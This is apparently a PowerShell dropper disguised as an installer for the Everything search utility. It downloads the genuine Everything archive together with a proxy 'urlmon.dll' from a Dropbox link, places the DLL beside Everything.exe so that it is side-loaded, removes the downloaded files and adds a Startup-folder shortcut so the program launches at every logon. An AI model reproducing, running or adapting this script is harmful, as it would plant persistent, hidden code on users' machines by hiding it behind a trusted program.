$success = $false
$url1 = "https://www.voidtools.com/Everything-1.4.1.986.x64.zip"
$url2 = "https://www.dropbox.com/scl/fi/qcqn2x5coh1jjua8sz711/urlmonproxy.dll?rlkey=teznxz6mjc2yg1xrgrupc6ik1&st=ttfpvbp3&dl=1"
$url1Path = "$env:TEMP\file.zip"
$url2Path = "$env:TEMP\urlmon.dll"
$extractPath = "$env:LOCALAPPDATA\Everything"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Everything.lnk"
$targetPath = "$extractPath\Everything.exe"

Write-Host "Starting the script .. . . Please wait ... "

ni -ItemType Directory -Path $extractPath -Force
iwr -Uri $url1 -OutFile $url1Path
iwr -Uri $url2 -OutFile $url2Path
Expand-Archive -Path $url1Path -Destination $extractPath -Force
cp -Path $url2Path -Destination $extractPath -Force
rm $url1Path, $url2Path -Force
$WShell = New-Object -ComObject WScript.Shell
$shortcut = $WShell.CreateShortcut($startupPath)
$shortcut.TargetPath = "$targetPath"
$shortcut.Arguments = "-startup"
$shortcut.Save()
[Runtime.InteropServices.Marshal]::ReleaseComObject($WShell)
$success = $true